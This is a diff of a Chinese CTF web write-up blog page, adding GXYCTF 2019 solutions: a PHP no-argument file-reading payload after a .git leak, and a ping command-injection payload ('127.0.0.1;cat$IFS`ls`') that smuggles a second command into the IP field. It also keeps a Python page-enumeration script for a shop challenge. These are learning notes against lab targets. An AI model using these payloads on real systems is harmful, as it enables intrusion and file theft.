@@ -82,14 +82,16 @@
 
 
 
-<meta name="description" content="脚本找lv6会员 12345678import requestsurl = &quot;http://web44.buuoj.cn/shop?page=&quot;for i in range(2,1000):    res = requests.get(url+str(i)).content    if &quot;lv6&quot; in res:        print i        break 进去改价格和折扣,把折扣改">
+<meta name="description" content="GXYCTF 2019 禁止套娃 .git文件泄露, 泄露出来的源码和真实源码竟然有差异, 我傻了 payload: 12var_dump(scandir(chr(ord(hebrevc(crypt(phpversion()))))));readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MiscInWeb &amp; python web[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/05/27/MiscInWeb/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="脚本找lv6会员 12345678import requestsurl = &quot;http://web44.buuoj.cn/shop?page=&quot;for i in range(2,1000):    res = requests.get(url+str(i)).content    if &quot;lv6&quot; in res:        print i        break 进去改价格和折扣,把折扣改">
+<meta property="og:description" content="GXYCTF 2019 禁止套娃 .git文件泄露, 泄露出来的源码和真实源码竟然有差异, 我傻了 payload: 12var_dump(scandir(chr(ord(hebrevc(crypt(phpversion()))))));readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/image-20191230154140515.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20191230153904533.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61510960-a5959180-aa27-11e9-8e97-85fc732fb9ec.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61510982-bd6d1580-aa27-11e9-8e6f-edf56d75bd82.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61510999-d4136c80-aa27-11e9-8478-25a46b4e985d.png">
@@ -110,11 +112,11 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58483762-6e2b0700-8193-11e9-9d00-fb36d55a8adf.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58484538-d6c6b380-8194-11e9-8abd-872dfbe583b5.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/59102510-e1d0cf00-895e-11e9-9d95-66589f9ad9ee.png">
-<meta property="og:updated_time" content="2019-12-28T18:10:38.693Z">
+<meta property="og:updated_time" content="2019-12-30T07:41:49.012Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MiscInWeb &amp; python web[working forever]">
-<meta name="twitter:description" content="脚本找lv6会员 12345678import requestsurl = &quot;http://web44.buuoj.cn/shop?page=&quot;for i in range(2,1000):    res = requests.get(url+str(i)).content    if &quot;lv6&quot; in res:        print i        break 进去改价格和折扣,把折扣改">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/61510960-a5959180-aa27-11e9-8e97-85fc732fb9ec.png">
+<meta name="twitter:description" content="GXYCTF 2019 禁止套娃 .git文件泄露, 泄露出来的源码和真实源码竟然有差异, 我傻了 payload: 12var_dump(scandir(chr(ord(hebrevc(crypt(phpversion()))))));readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20191230154140515.png">
 
 
 
@@ -354,8 +356,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-29T02:10:38+08:00">
-                2019-12-29
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-30T15:41:49+08:00">
+                2019-12-30
               </time>
             
           </span>
@@ -404,7 +406,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  4.9k
+                  5k
                 </span>
               
 
@@ -420,7 +422,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  24
+                  25
                 </span>
               
             </div>
@@ -441,7 +443,19 @@
       
 
       
-        <p><img src="https://user-images.githubusercontent.com/40637063/61510960-a5959180-aa27-11e9-8e97-85fc732fb9ec.png" alt="1563077535097"></p>
+        <h2 id="GXYCTF-2019-禁止套娃">GXYCTF 2019 禁止套娃</h2>
+<p>.git文件泄露, 泄露出来的源码和真实源码竟然有差异, 我傻了</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(ord(hebrevc(crypt(phpversion()))))));</span><br><span class="line">readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20191230154140515.png" alt="image-20191230154140515"></p>
+<p><img src="/images/image-20191230153904533.png" alt="image-20191230153904533"></p>
+<h2 id="GXYCTF-2019-pingpingping">GXYCTF 2019 pingpingping</h2>
+<p>开局很简单, 题目让我们用get方式传入ip, 并在后台执行&quot;ping -c 4 &quot;这个ip的命令, 经过测试发现过滤花括号空格等符号,</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat$IFS`ls`</span><br></pre></td></tr></table></figure>
+<p>利用的是反引号内的东西可以作为命令进行执行的特征</p>
+<h2 id="忘了题目名字了">忘了题目名字了</h2>
+<p><img src="https://user-images.githubusercontent.com/40637063/61510960-a5959180-aa27-11e9-8e97-85fc732fb9ec.png" alt="1563077535097"></p>
 <p>脚本找lv6会员</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url+str(i)).content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"lv6"</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p>进去改价格和折扣,把折扣改成很低的一个值就会跳转到一个admin界面,但是要登录admin.</p>
@@ -744,7 +758,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">38</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -832,7 +846,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-东南赛区-web4"><span class="nav-number">1.</span> <span class="nav-text">CISCN 2019 东南赛区 web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#360ctf-立誓要成为admin的男人"><span class="nav-number">2.</span> <span class="nav-text">360ctf 立誓要成为admin的男人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web2"><span class="nav-number">3.</span> <span class="nav-text">swpuctf 2019 web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web3"><span class="nav-number">4.</span> <span class="nav-text">swpuctf 2019 web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insomni’hack-2019-Phuck2"><span class="nav-number">5.</span> <span class="nav-text">Insomni’hack 2019 Phuck2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hitcon2016-Leaking"><span class="nav-number">6.</span> <span class="nav-text">hitcon2016 Leaking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buuoj-unicorn-shop"><span class="nav-number">7.</span> <span class="nav-text">buuoj unicorn shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-爆破-2"><span class="nav-number">8.</span> <span class="nav-text">ichunqiu 爆破-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-爆破-1"><span class="nav-number">9.</span> <span class="nav-text">ichunqiu 爆破-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-象棋"><span class="nav-number">10.</span> <span class="nav-text">ichunqiu 象棋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-时间"><span class="nav-number">11.</span> <span class="nav-text">ichunqiu 时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-强网杯-高明的黑客"><span class="nav-number">12.</span> <span class="nav-text">2019 强网杯 高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-Look"><span class="nav-number">13.</span> <span class="nav-text">ichunqiu Look</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-try"><span class="nav-number">14.</span> <span class="nav-text">ichunqiu try</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-fuzzing"><span class="nav-number">15.</span> <span class="nav-text">ichunqiu fuzzing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu百度杯-登录"><span class="nav-number">16.</span> <span class="nav-text">ichunqiu百度杯 登录</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF-2019-禁止套娃"><span class="nav-number">1.</span> <span class="nav-text">GXYCTF 2019 禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF-2019-pingpingping"><span class="nav-number">2.</span> <span class="nav-text">GXYCTF 2019 pingpingping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#忘了题目名字了"><span class="nav-number">3.</span> <span class="nav-text">忘了题目名字了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-东南赛区-web4"><span class="nav-number">4.</span> <span class="nav-text">CISCN 2019 东南赛区 web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#360ctf-立誓要成为admin的男人"><span class="nav-number">5.</span> <span class="nav-text">360ctf 立誓要成为admin的男人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web2"><span class="nav-number">6.</span> <span class="nav-text">swpuctf 2019 web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web3"><span class="nav-number">7.</span> <span class="nav-text">swpuctf 2019 web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insomni’hack-2019-Phuck2"><span class="nav-number">8.</span> <span class="nav-text">Insomni’hack 2019 Phuck2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hitcon2016-Leaking"><span class="nav-number">9.</span> <span class="nav-text">hitcon2016 Leaking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buuoj-unicorn-shop"><span class="nav-number">10.</span> <span class="nav-text">buuoj unicorn shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-爆破-2"><span class="nav-number">11.</span> <span class="nav-text">ichunqiu 爆破-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-爆破-1"><span class="nav-number">12.</span> <span class="nav-text">ichunqiu 爆破-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-象棋"><span class="nav-number">13.</span> <span class="nav-text">ichunqiu 象棋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-时间"><span class="nav-number">14.</span> <span class="nav-text">ichunqiu 时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-强网杯-高明的黑客"><span class="nav-number">15.</span> <span class="nav-text">2019 强网杯 高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-Look"><span class="nav-number">16.</span> <span class="nav-text">ichunqiu Look</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-try"><span class="nav-number">17.</span> <span class="nav-text">ichunqiu try</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-fuzzing"><span class="nav-number">18.</span> <span class="nav-text">ichunqiu fuzzing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu百度杯-登录"><span class="nav-number">19.</span> <span class="nav-text">ichunqiu百度杯 登录</span></a></li></ol></div>
             
 
           </div>
@@ -852,7 +866,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -866,7 +880,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">63.1k</span>
+    <span title="Site words total count">65k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
